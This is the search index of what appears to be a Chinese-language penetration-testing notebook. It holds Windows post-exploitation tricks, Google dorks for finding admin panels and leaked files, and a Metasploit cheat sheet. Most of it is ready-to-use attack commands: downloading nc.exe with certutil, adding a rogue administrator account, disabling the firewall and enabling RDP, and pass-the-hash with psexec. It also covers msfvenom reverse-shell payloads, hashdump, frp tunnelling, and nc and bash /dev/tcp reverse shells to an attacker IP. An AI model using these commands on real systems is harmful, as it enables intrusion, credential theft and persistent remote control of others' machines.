{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction "},"hack/hack.html":{"url":"hack/hack.html","title":"Hack","keywords":"","body":"攻击链 工具链 Tips: github下载加速 https://ghproxy.com/https://github.com/xxx https://github.com/b1gcat/DarkEye https://github.com/shadow1ng/fscan https://github.com/OJ/gobuster https://github.com/shmilylty/OneForAll https://github.com/EnableSecurity/wafw00f https://github.com/danielmiessler/SecLists "},"hack/内网技巧.html":{"url":"hack/内网技巧.html","title":"内网技巧","keywords":"","body":"内网技巧 下载 Windows certutil -urlcache -split -f http://fuck/nc.exe 查找 Windows # 查找index.html或index.*的文件 for /r d:/ %i in (index.html) do @echo %i for /r d:/ %i in (index.*) do @echo %i # 从*.html或*.*中查找内容 findstr /s/i/n /d:D:\\sec_tools\\ /c:\"html\" *.html findstr /s/i/n /d:C:\\windows\\ /c:\"success\" *.* # 找到文件后将hwhw2.txt内容写入目标，并将目标重命名为xxx.jsp for /r \"f:\\\" %i in (2020112601719755*) do @type hwhw2.txt > %i.jsp 添加用户 Window # 添加 net user hwhwhw2021 12345678Xx@321 /add net localgroup administrators hwhwhw2021 /add # 删除 net user hwhwhw2021 /del Linux 略 内网探测简易版 # Windows for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I \\| findstr \"TTL=\" # Linux for i in {1..254}; do ping 192.168.1.$i -c 1 -w 1|grep ttl; done 域控 # 查域控主机 ipconfig /all #Window IP 配置中找 `主DNS后缀` 如果是这个样子wtf.xxx 尝试ping wtf.xxx可以出主控主机地址 或 dsquery server && net time /domain # 获取域控器主机名 net group \"domain controllers\" /domain # 获取域控管理员 net group \"domain admins\" /domain # 获取域内计算机 这个步骤可能出现6118错误，要想其它办法了 net view /domain:XX # 查询域站点 dsquery site # 获取hash值 todo: # 利用hash登录其它主机 use exploit/windows/smb/psexec set rhosts wonima set smbuser administrator set smbpass xxx:ooo IIS站点查询 C:\\Windows\\System32\\inetsrv\\appcmd list site C:\\Windows\\System32\\inetsrv\\appcmd list vdir 关闭防火墙 Windows server 2003系统及以前版本，命令如下： netsh firewall set opmode disable Windows server 2003之后系统版本，命令如下： netsh advfirewall set allprofiles state off 开3389服务 # 查远程桌面端口 REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber # win2003 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # win2008+ wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f "},"hack/googlehack.html":{"url":"hack/googlehack.html","title":"Googlehack","keywords":"","body":"Google Hacking 常用GoogleHacking语法 1、intext：（仅针对Google有效）把网页中的正文内容中的某个字符作为搜索的条件 2、intitle：把网页标题中的某个字符作为搜索的条件 3、cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 4、filetype/ext：指定一个格式类型的文件作为搜索对象 5、inurl：搜索包含指定字符的URL 6、site：在指定的(域名)站点搜索相关内容 其他GoogleHacking语法 1、引号 '' \"把关键字打上引号后，把引号部分作为整体来搜索 2、or同时搜索两个或更多的关键字 3、link搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL 4、info查找指定站点的一些基本信息 GoogleHacking典型用法 管理后台地址 site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 site:target.com inurl:filesite:target.com inurl:upload 注入页面 site:target.com inurl:php?id= 编辑器页面 site:target.com inurl:ewebeditor 目录遍历漏洞 site:target.com intitle:index.of SQL错误 site:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:”Warning: pg_connect()\" phpinfo() site:target.com ext:php intitle:phpinfo \"published by the PHP Group\" 配置文件泄露 site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 site:target.com ext:.log 备份和历史文件泄露 site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 site:target.com intext:@target.com site:target.com 邮件 site:target.com email 社工信息 site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 "},"hack/msf.html":{"url":"hack/msf.html","title":"Msf","keywords":"","body":"MSF 一条龙 Payload制作 Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT=12306 -f elf > shell.elf msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT=12306 -f elf > shell.elf Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=12306 -f exe > meinv.exe msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=12306 -f exe > meinv.exe Mac msfvenom -p osx/x64/shell_reverse_tcp LHOST= LPORT=12306-f macho > shell.machoWeb PHP msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT=12306 -f raw > shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=12306 -f asp > shell.asp JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=12306 -f raw > shell.jsp WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=12306 -f war > shell.war Python msfvenom -p cmd/unix/reverse_python LHOST= LPORT=12306 -f raw > shell.py Bash msfvenom -p cmd/unix/reverse_bash LHOST= LPORT=12306 -f raw > shell.sh Perl msfvenom -p cmd/unix/reverse_perl LHOST= LPORT=12306 -f raw > shell.pl 技巧 msfvenom -l payloads #查看支持的payloads -i 10 #生成payload带上-i 10表示对payload编码10次 反弹设置 #全局设置代理，似乎没手感 不推荐 #set proxies socks5:127.0.0.1:8080 #Payload值根据实际使用的payload填写 set exitonsession false use exploits/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST VPSIP set LPORT 12307 exploit -j #获取session后设置路由 run post/multi/manage/autoroute #获取各种hashdump（search），未知密码情况下hashdump可以用来横向登录其它主机 run post/windows/gather/hashdump 或 run post/windows/gather/smart_hashdump #代理设置 感觉没有frp好用 use auxiliary/server/socks_proxy #只是临时想看下内网服务可以做端口映射，很快、稳、也方便。 meterpreter > portfwd add -l 14448 -r 172.16.200.6 -p 3389 #设置好后根据前面的msf路由可以打攻击流量，跨网段的还是用proxychain启动msf打比较稳。 use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS 10.20.100.201 exploit 代理设置 代理服务frp frpc [common] #remote vps addr server_addr = vpsip server_port = 64447 tls_enable = true pool_count = 5 [plugin_socks] type = tcp remote_port = 54321 plugin = socks5 use_encryption = true frps [common] bind_addr = 0.0.0.0 bind_port = 64447 dashboard_port = 7500 dashboard_user = admin1 代理服务reGeorg 参见Readme 代理客户端 proxychain4 #配置proxychain的代理连上frp，端口为54321 proxychain4 msfconsole 浏览器 # 配置参数参考 sock5 ip vps port 54321 # 注意 谷歌浏览器不支持带密码的sock5 其它 #简易版反连 # Linux vul机器 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 |nc IP 4444 >/tmp/f 或 bash -i >& /dev/tcp/IP/4444 0>&1 # Window vul机器 nc ip 4444 -e c:\\windows\\system32\\cmd.exe #反弹机器 nc -lvp 4444 "}}